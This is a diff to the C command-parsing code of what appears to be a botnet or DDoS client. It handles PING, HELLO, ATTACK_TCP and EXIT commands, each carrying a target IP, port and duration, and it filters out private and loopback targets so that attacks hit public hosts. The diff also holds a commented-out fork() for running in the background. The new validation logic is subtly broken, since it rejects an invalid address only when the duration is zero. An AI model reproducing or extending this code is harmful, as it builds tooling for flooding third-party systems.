@@ -3,8 +3,12 @@
 #include <string.h>
 #include <math.h>
 #include <stdint.h>
+#include <unistd.h>
+
 
 #include "command.h"
+
+#ifdef DEBUG
 
 const char *__command_type_strings[] = {
     "PING",
@@ -18,13 +22,15 @@ const char *__command_type_strings[] = {
 
 static inline char *get_command_type_string(enum command_type type)
 {
-    if (type == 0 || (type & (type - 1)) != 0 || type > (1 << 4))
+    if (type == 0 || (type & (type - 1)) != 0 || type > (1 << 5))
     {
         return "Unknown Command";
     }
 
     return __command_type_strings[__builtin_ctz(type)];
 }
+
+#endif
 
 static uint8_t get_command_from_buffer(struct command *cmd, uint8_t buffer[])
 {
@@ -45,7 +51,8 @@ static uint8_t get_command_from_buffer(struct command *cmd, uint8_t buffer[])
         cmd->data.target.o3 = buffer[4];
         cmd->data.target.o4 = buffer[5];
 
-        cmd->data.port = buffer[6];
+        // Buffer is a 1byte array, port is 2bytes so its splitted
+        cmd->data.port = (buffer[6] << 8) | buffer[7];
     }
 
     return cmd->type;
@@ -68,6 +75,8 @@ static uint8_t parse_command(struct command *cmd)
 
     switch (cmd->type)
     {
+    case HELLO:
+        break;
     case ATTACK_TCP:
         break;
 
@@ -90,10 +99,28 @@ static uint8_t parse_command(struct command *cmd)
     return 1;
 }
 
+static inline int is_invalid_ip(uint8_t o1, uint8_t o2, uint8_t o3, uint8_t o4)
+{
+    return (o1 == 0 && o2 == 0 && o3 == 0 && o4 == 0) || // 0.0.0.0 (non valido)
+           (o1 == 127) ||                                // 127.x.x.x (loopback)
+           (o1 == 0) ||                                  // 0.x.x.x (net addr)
+           (o1 == 255) ||                                // 255.x.x.x (broadcast)
+           (o1 == 10) ||                                 // 10.x.x.x (privato)
+           (o1 == 172 && o2 >= 16 && o2 <= 31) ||        // 172.16.x.x - 172.31.x.x (privato)
+           (o1 == 192 && o2 == 168);                     // 192.168.x.x (privato)
+}
+
 uint8_t parse_command_from_buffer(uint8_t buffer[])
 {
 
-    uint8_t type, duration, port;
+    //__pid_t command_pid = fork();
+    //if (command_pid == -1 || command_pid > 0)
+    //{
+    //    return 0;
+    //}
+
+    uint8_t type, duration;
+    uint16_t port;
     uint8_t o1, o2, o3, o4;
 
     struct command cmd = command_init();
@@ -118,18 +145,13 @@ uint8_t parse_command_from_buffer(uint8_t buffer[])
 #endif
 
     // validations
-    if (
-        (type == 0) || (duration == 0) || (port == 0) || (o1 == 0 && o2 == 0 && o3 == 0 && o4 == 0) // 0.0.0.0 (not valid)
-        || (o1 == 127)                                                                              // 127.x.x.x (loopback)
-        || (o1 == 0) ||                                                                             // 0.x.x.x (net addr)
-        (o1 == 255) ||                                                                              // 255.x.x.x (broadcast)
-        (o1 == 10) ||                                                                               // 10.x.x.x (private)
-        (o1 == 172 && o2 >= 16 && o2 <= 31) ||                                                      // 172.16.x.x - 172.31.x.x (private)
-        (o1 == 192 && o2 == 168)                                                                    // 192.168.x.x (private)
-    )
+    if (type == 0 ||
+        ((type != PING && type != EXIT && type != HELLO) && (port == 0 || (is_invalid_ip(o1, o2, o3, o4) && (duration == 0)))))
     {
         return 0;
     }
+
+    uint8_t result = parse_command(&cmd);
 
     return 1;
 }
